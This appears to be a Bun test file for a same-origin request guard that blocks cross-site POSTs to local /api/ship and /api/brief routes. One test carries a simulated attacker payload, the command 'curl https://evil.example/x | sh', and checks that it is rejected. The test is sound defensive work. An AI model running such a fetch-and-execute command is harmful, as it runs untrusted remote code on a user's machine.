import { describe, test, expect } from 'bun:test';
import { checkSameOrigin, rejectCrossOrigin } from '../lib/request-guard';
import { POST as shipPost } from '../app/api/ship/route';
import { POST as briefPost } from '../app/api/brief/route';

const h = (o: Record<string, string>) => new Headers(o);

describe('checkSameOrigin', () => {
  test('same-origin browser fetch (what BriefMePane sends) is allowed', () => {
    expect(checkSameOrigin(h({
      host: 'localhost:3000',
      origin: 'http://localhost:3000',
      'sec-fetch-site': 'same-origin',
    })).ok).toBe(true);
  });

  test('direct navigation (sec-fetch-site=none) is allowed', () => {
    expect(checkSameOrigin(h({ host: 'localhost:3000', 'sec-fetch-site': 'none' })).ok).toBe(true);
  });

  test('non-browser client with no Origin / Sec-Fetch-Site is allowed', () => {
    expect(checkSameOrigin(h({ host: 'localhost:3000' })).ok).toBe(true);
  });

  test('cross-site request is rejected via sec-fetch-site', () => {
    const r = checkSameOrigin(h({
      host: 'localhost:3000',
      origin: 'https://evil.example',
      'sec-fetch-site': 'cross-site',
    }));
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/cross-site/);
  });

  test('same-site (sibling subdomain) is still rejected', () => {
    expect(checkSameOrigin(h({ host: 'localhost:3000', 'sec-fetch-site': 'same-site' })).ok).toBe(false);
  });

  test('Origin mismatch is rejected when sec-fetch-site is absent (older browsers)', () => {
    const r = checkSameOrigin(h({ host: 'localhost:3000', origin: 'https://evil.example' }));
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/does not match/);
  });

  test('Origin matching Host (including port) is allowed without sec-fetch-site', () => {
    expect(checkSameOrigin(h({ host: 'localhost:3000', origin: 'http://localhost:3000' })).ok).toBe(true);
    expect(checkSameOrigin(h({ host: '127.0.0.1:3000', origin: 'http://127.0.0.1:3000' })).ok).toBe(true);
  });

  test('same hostname on a different port is rejected', () => {
    expect(checkSameOrigin(h({ host: 'localhost:3000', origin: 'http://localhost:8080' })).ok).toBe(false);
  });

  test('Origin "null" (sandboxed iframe / file://) is rejected', () => {
    expect(checkSameOrigin(h({ host: 'localhost:3000', origin: 'null' })).ok).toBe(false);
  });

  test('Origin present but Host missing is rejected', () => {
    expect(checkSameOrigin(h({ origin: 'http://localhost:3000' })).ok).toBe(false);
  });
});

describe('rejectCrossOrigin', () => {
  test('returns null for an allowed request', () => {
    const req = new Request('http://localhost:3000/api/ship', {
      method: 'POST',
      headers: { host: 'localhost:3000', 'sec-fetch-site': 'same-origin' },
    });
    expect(rejectCrossOrigin(req)).toBeNull();
  });

  test('returns a 403 JSON response for a cross-site request', async () => {
    const req = new Request('http://localhost:3000/api/ship', {
      method: 'POST',
      headers: { host: 'localhost:3000', origin: 'https://evil.example', 'sec-fetch-site': 'cross-site' },
    });
    const res = rejectCrossOrigin(req);
    expect(res).not.toBeNull();
    expect(res!.status).toBe(403);
    const body = await res!.json();
    expect(body.error).toMatch(/forbidden/);
  });
});

describe('route handlers refuse cross-site POSTs before doing anything', () => {
  // A "simple" cross-site request: text/plain body, no preflight. This is
  // exactly what a malicious page can send to localhost:3000.
  const evil = (path: string, body: string) => new Request(`http://localhost:3000${path}`, {
    method: 'POST',
    headers: {
      host: 'localhost:3000',
      origin: 'https://evil.example',
      'sec-fetch-site': 'cross-site',
      'content-type': 'text/plain',
    },
    body,
  });

  test('POST /api/ship with attacker-chosen repo_path + command is rejected with 403', async () => {
    const res = await shipPost(evil('/api/ship', JSON.stringify({
      slug: 'people/alice-example',
      repo_path: '/Users/victim/repo',
      command: 'curl https://evil.example/x | sh',
    })));
    expect(res.status).toBe(403);
    const body = await res.json();
    expect(body.error).toMatch(/forbidden/);
  });

  test('POST /api/brief from a foreign origin is rejected with 403', async () => {
    const res = await briefPost(evil('/api/brief', ''));
    expect(res.status).toBe(403);
  });
});
